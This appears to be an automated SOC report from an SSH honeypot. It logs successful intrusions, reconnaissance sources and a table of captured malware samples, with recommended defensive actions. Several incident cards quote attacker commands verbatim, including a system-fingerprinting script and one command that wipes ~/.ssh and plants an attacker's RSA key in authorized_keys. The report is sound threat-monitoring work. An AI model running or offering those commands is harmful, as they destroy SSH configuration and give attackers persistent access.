| **Last Seen** | 2026-07-24 04:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:45:58` | `cowrie.session.connect` |
| `2026-07-24 04:45:58` | `cowrie.client.version` |
| `2026-07-24 04:45:58` | `cowrie.client.kex` |
| `2026-07-24 04:45:59` | `cowrie.login.success` |
| `2026-07-24 04:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.192.198[.]32` to AbuseIPDB if not already reported
- [ ] Block `45.192.198[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9ebb387d79f

| Field | Detail |
|---|---|
| **Source IP** | `45.192.198[.]32` |
| **First Seen** | 2026-07-24 04:45 |
| **Last Seen** | 2026-07-24 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:45:59` | `cowrie.session.connect` |
| `2026-07-24 04:45:59` | `cowrie.client.version` |
| `2026-07-24 04:46:00` | `cowrie.client.kex` |
| `2026-07-24 04:46:01` | `cowrie.login.success` |
| `2026-07-24 04:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.192.198[.]32` to AbuseIPDB if not already reported
- [ ] Block `45.192.198[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55824480e6b8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 04:46 |
| **Last Seen** | 2026-07-24 04:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:46:06` | `cowrie.session.connect` |
| `2026-07-24 04:46:06` | `cowrie.client.version` |
| `2026-07-24 04:46:06` | `cowrie.client.kex` |
| `2026-07-24 04:46:11` | `cowrie.login.success` |
| `2026-07-24 04:46:12` | `cowrie.session.params` |
| `2026-07-24 04:46:12` | `cowrie.command.input` |
| `2026-07-24 04:46:12` | `cowrie.command.input` |
| `2026-07-24 04:46:12` | `cowrie.command.input` |
| `2026-07-24 04:46:12` | `cowrie.command.input` |
| `2026-07-24 04:46:12` | `cowrie.command.input` |
| `2026-07-24 04:46:12` | `cowrie.command.success` |
| `2026-07-24 04:46:12` | `cowrie.command.input` |
| `2026-07-24 04:46:12` | `cowrie.command.input` |
| `2026-07-24 04:46:12` | `cowrie.command.input` |
| `2026-07-24 04:46:12` | `cowrie.command.input` |
| `2026-07-24 04:46:13` | `cowrie.log.closed` |
| `2026-07-24 04:46:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bb207d4d972

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:46 |
| **Last Seen** | 2026-07-24 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:46:55` | `cowrie.session.connect` |
| `2026-07-24 04:46:55` | `cowrie.client.version` |
| `2026-07-24 04:46:55` | `cowrie.client.kex` |
| `2026-07-24 04:46:56` | `cowrie.login.success` |
| `2026-07-24 04:46:56` | `cowrie.session.params` |
| `2026-07-24 04:46:56` | `cowrie.command.input` |
| `2026-07-24 04:46:56` | `cowrie.log.closed` |
| `2026-07-24 04:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dee1150012b

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]8` |
| **First Seen** | 2026-07-24 04:47 |
| **Last Seen** | 2026-07-24 04:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:47:34` | `cowrie.session.connect` |
| `2026-07-24 04:47:34` | `cowrie.client.version` |
| `2026-07-24 04:47:34` | `cowrie.client.kex` |
| `2026-07-24 04:47:36` | `cowrie.login.success` |
| `2026-07-24 04:47:37` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:47:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]8` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]8` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45fe1faefc8b

| Field | Detail |
|---|---|
| **Source IP** | `119.156.28[.]157` |
| **First Seen** | 2026-07-24 04:48 |
| **Last Seen** | 2026-07-24 04:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:48:24` | `cowrie.session.connect` |
| `2026-07-24 04:48:24` | `cowrie.client.version` |
| `2026-07-24 04:48:24` | `cowrie.client.kex` |
| `2026-07-24 04:48:25` | `cowrie.login.success` |
| `2026-07-24 04:48:26` | `cowrie.session.params` |
| `2026-07-24 04:48:26` | `cowrie.command.input` |
| `2026-07-24 04:48:26` | `cowrie.command.failed` |
| `2026-07-24 04:48:28` | `cowrie.log.closed` |
| `2026-07-24 04:48:29` | `cowrie.session.params` |
| `2026-07-24 04:48:29` | `cowrie.command.input` |
| `2026-07-24 04:48:29` | `cowrie.session.file_download` |
| `2026-07-24 04:48:29` | `cowrie.log.closed` |
| `2026-07-24 04:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.156.28[.]157` to AbuseIPDB if not already reported
- [ ] Block `119.156.28[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-196f4fc351cb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 04:48 |
| **Last Seen** | 2026-07-24 04:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:48:26` | `cowrie.session.connect` |
| `2026-07-24 04:48:26` | `cowrie.client.version` |
| `2026-07-24 04:48:27` | `cowrie.client.kex` |
| `2026-07-24 04:48:29` | `cowrie.login.success` |
| `2026-07-24 04:48:30` | `cowrie.session.params` |
| `2026-07-24 04:48:30` | `cowrie.command.input` |
| `2026-07-24 04:48:30` | `cowrie.command.input` |
| `2026-07-24 04:48:30` | `cowrie.command.input` |
| `2026-07-24 04:48:30` | `cowrie.command.input` |
| `2026-07-24 04:48:30` | `cowrie.command.input` |
| `2026-07-24 04:48:30` | `cowrie.command.success` |
| `2026-07-24 04:48:30` | `cowrie.command.input` |
| `2026-07-24 04:48:30` | `cowrie.command.input` |
| `2026-07-24 04:48:30` | `cowrie.command.input` |
| `2026-07-24 04:48:30` | `cowrie.command.input` |
| `2026-07-24 04:48:31` | `cowrie.log.closed` |
| `2026-07-24 04:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e64e70a95ca4

| Field | Detail |
|---|---|
| **Source IP** | `119.156.28[.]157` |
| **First Seen** | 2026-07-24 04:48 |
| **Last Seen** | 2026-07-24 04:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:48:29` | `cowrie.session.connect` |
| `2026-07-24 04:48:29` | `cowrie.client.version` |
| `2026-07-24 04:48:29` | `cowrie.client.kex` |
| `2026-07-24 04:48:31` | `cowrie.login.success` |
| `2026-07-24 04:48:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.156.28[.]157` to AbuseIPDB if not already reported
- [ ] Block `119.156.28[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-742a3a03600e

| Field | Detail |
|---|---|
| **Source IP** | `119.156.28[.]157` |
| **First Seen** | 2026-07-24 04:48 |
| **Last Seen** | 2026-07-24 04:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:48:31` | `cowrie.session.connect` |
| `2026-07-24 04:48:31` | `cowrie.client.version` |
| `2026-07-24 04:48:31` | `cowrie.client.kex` |
| `2026-07-24 04:48:32` | `cowrie.login.success` |
| `2026-07-24 04:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.156.28[.]157` to AbuseIPDB if not already reported
- [ ] Block `119.156.28[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cec18a057c6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:48 |
| **Last Seen** | 2026-07-24 04:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:48:40` | `cowrie.session.connect` |
| `2026-07-24 04:48:40` | `cowrie.client.version` |
| `2026-07-24 04:48:40` | `cowrie.client.kex` |
| `2026-07-24 04:48:40` | `cowrie.login.success` |
| `2026-07-24 04:48:41` | `cowrie.session.params` |
| `2026-07-24 04:48:41` | `cowrie.command.input` |
| `2026-07-24 04:48:41` | `cowrie.log.closed` |
| `2026-07-24 04:48:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c3320a61ad5

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:50 |
| **Last Seen** | 2026-07-24 04:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:50:24` | `cowrie.session.connect` |
| `2026-07-24 04:50:24` | `cowrie.client.version` |
| `2026-07-24 04:50:24` | `cowrie.client.kex` |
| `2026-07-24 04:50:24` | `cowrie.login.success` |
| `2026-07-24 04:50:25` | `cowrie.session.params` |
| `2026-07-24 04:50:25` | `cowrie.command.input` |
| `2026-07-24 04:50:26` | `cowrie.log.closed` |
| `2026-07-24 04:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d42b221cdadf

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 04:50 |
| **Last Seen** | 2026-07-24 04:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:50:33` | `cowrie.session.connect` |
| `2026-07-24 04:50:33` | `cowrie.client.version` |
| `2026-07-24 04:50:33` | `cowrie.client.kex` |
| `2026-07-24 04:50:36` | `cowrie.login.success` |
| `2026-07-24 04:50:38` | `cowrie.session.params` |
| `2026-07-24 04:50:38` | `cowrie.command.input` |
| `2026-07-24 04:50:38` | `cowrie.command.input` |
| `2026-07-24 04:50:38` | `cowrie.command.input` |
| `2026-07-24 04:50:38` | `cowrie.command.input` |
| `2026-07-24 04:50:38` | `cowrie.command.input` |
| `2026-07-24 04:50:38` | `cowrie.command.success` |
| `2026-07-24 04:50:38` | `cowrie.command.input` |
| `2026-07-24 04:50:38` | `cowrie.command.input` |
| `2026-07-24 04:50:38` | `cowrie.command.input` |
| `2026-07-24 04:50:38` | `cowrie.command.input` |
| `2026-07-24 04:50:39` | `cowrie.log.closed` |
| `2026-07-24 04:50:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fe7d78b2c06

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:52 |
| **Last Seen** | 2026-07-24 04:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:52:09` | `cowrie.session.connect` |
| `2026-07-24 04:52:09` | `cowrie.client.version` |
| `2026-07-24 04:52:09` | `cowrie.client.kex` |
| `2026-07-24 04:52:09` | `cowrie.login.success` |
| `2026-07-24 04:52:10` | `cowrie.session.params` |
| `2026-07-24 04:52:10` | `cowrie.command.input` |
| `2026-07-24 04:52:10` | `cowrie.log.closed` |
| `2026-07-24 04:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca14573e865a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 04:52 |
| **Last Seen** | 2026-07-24 04:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:52:47` | `cowrie.session.connect` |
| `2026-07-24 04:52:48` | `cowrie.client.version` |
| `2026-07-24 04:52:48` | `cowrie.client.kex` |
| `2026-07-24 04:52:50` | `cowrie.login.success` |
| `2026-07-24 04:52:53` | `cowrie.session.params` |
| `2026-07-24 04:52:53` | `cowrie.command.input` |
| `2026-07-24 04:52:53` | `cowrie.command.input` |
| `2026-07-24 04:52:53` | `cowrie.command.input` |
| `2026-07-24 04:52:53` | `cowrie.command.input` |
| `2026-07-24 04:52:53` | `cowrie.command.input` |
| `2026-07-24 04:52:53` | `cowrie.command.success` |
| `2026-07-24 04:52:53` | `cowrie.command.input` |
| `2026-07-24 04:52:53` | `cowrie.command.input` |
| `2026-07-24 04:52:53` | `cowrie.command.input` |
| `2026-07-24 04:52:53` | `cowrie.command.input` |
| `2026-07-24 04:52:53` | `cowrie.log.closed` |
| `2026-07-24 04:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32a434430f82

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:53 |
| **Last Seen** | 2026-07-24 04:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:53:51` | `cowrie.session.connect` |
| `2026-07-24 04:53:51` | `cowrie.client.version` |
| `2026-07-24 04:53:51` | `cowrie.client.kex` |
| `2026-07-24 04:53:52` | `cowrie.login.success` |
| `2026-07-24 04:53:52` | `cowrie.session.params` |
| `2026-07-24 04:53:52` | `cowrie.command.input` |
| `2026-07-24 04:53:52` | `cowrie.log.closed` |
| `2026-07-24 04:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **5** | 2026-07-24 03:00 | 2026-07-24 04:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]163` | **3** | 2026-07-24 03:55 | 2026-07-24 03:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-07-24 03:21 | 2026-07-24 03:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]94` | **3** | 2026-07-24 04:55 | 2026-07-24 04:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `118.252.27[.]84` | **2** | 2026-07-24 03:16 | 2026-07-24 03:18 | 2m | 0 | `T1592` | 🟢 LOW |
| `16.58.56[.]214` | **2** | 2026-07-24 03:48 | 2026-07-24 03:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | **2** | 2026-07-24 04:18 | 2026-07-24 04:36 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.53.199[.]41` | **2** | 2026-07-24 03:40 | 2026-07-24 03:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `79.136.8[.]69` | **2** | 2026-07-24 03:38 | 2026-07-24 04:09 | 4m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | **2** | 2026-07-24 02:57 | 2026-07-24 03:16 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-07-24 03:29 | 2026-07-24 03:29 | 5s | 0 | `T1592` | 🟢 LOW |
| `111.70.13[.]240` | 1 | 2026-07-24 03:12 | 2026-07-24 03:12 | 6s | 0 | `T1592` | 🟢 LOW |
| `111.70.25[.]161` | 1 | 2026-07-24 04:47 | 2026-07-24 04:48 | 16s | 0 | `T1592` | 🟢 LOW |
| `117.223.152[.]94` | 1 | 2026-07-24 03:12 | 2026-07-24 03:12 | 1s | 0 | `T1592` | 🟢 LOW |
| `124.70.97[.]100` | 1 | 2026-07-24 03:08 | 2026-07-24 03:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.71.229[.]94` | 1 | 2026-07-24 03:16 | 2026-07-24 03:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `166.62.102[.]109` | 1 | 2026-07-24 04:52 | 2026-07-24 04:52 | 30s | 0 | `T1592` | 🟢 LOW |
| `176.10.203[.]54` | 1 | 2026-07-24 03:46 | 2026-07-24 03:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.92.236[.]135` | 1 | 2026-07-24 03:33 | 2026-07-24 03:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.109.205[.]160` | 1 | 2026-07-24 03:37 | 2026-07-24 03:37 | 12s | 0 | `T1592` | 🟢 LOW |
| `34.140.11[.]164` | 1 | 2026-07-24 03:40 | 2026-07-24 03:40 | 8s | 0 | `T1592` | 🟢 LOW |
| `36.22.65[.]89` | 1 | 2026-07-24 03:14 | 2026-07-24 03:15 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]240` | 1 | 2026-07-24 04:04 | 2026-07-24 04:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-07-24 03:46 | 2026-07-24 03:46 | 1s | 0 | `T1592` | 🟢 LOW |
| `49.124.149[.]213` | 1 | 2026-07-24 04:36 | 2026-07-24 04:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.149[.]54` | 1 | 2026-07-24 03:04 | 2026-07-24 03:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]212` | 1 | 2026-07-24 04:47 | 2026-07-24 04:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]62` | 1 | 2026-07-24 03:13 | 2026-07-24 03:13 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-07-24 03:20 | 2026-07-24 03:20 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
